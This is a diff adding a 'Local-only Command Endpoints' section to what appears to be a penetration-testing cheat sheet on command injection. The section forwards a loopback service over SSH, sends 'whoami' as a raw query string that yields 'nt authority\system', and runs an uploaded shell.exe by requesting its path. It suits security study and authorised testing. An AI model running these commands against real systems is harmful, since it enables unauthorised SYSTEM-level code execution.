@@ -11,6 +11,28 @@
 * Hidden ports:
 * Some frameworks open debug ports that take in arbitrary commands
 
+### Local-only Command Endpoints
+
+Internal admin or dev services may only bind to loopback. If you have SSH access, forward the local service and test suspicious query-only hints like `http://host/?`.
+
+```bash
+ssh user@TARGET -L 8888:127.0.0.1:80
+curl 'http://127.0.0.1:8888/?whoami'
+```
+
+PowerShell `HttpListener` wrappers sometimes execute the raw query string as a command. A successful response may look like:
+
+```text
+nt authority\system
+```
+
+If file upload or transfer is available, drop a payload and execute it by passing the full path:
+
+```http
+GET /?C:\Users\user\Desktop\shell.exe HTTP/1.1
+Host: 127.0.0.1:8888
+```
+
 ### Overview
 
 * Use command line symbols within the input to alter the executed command
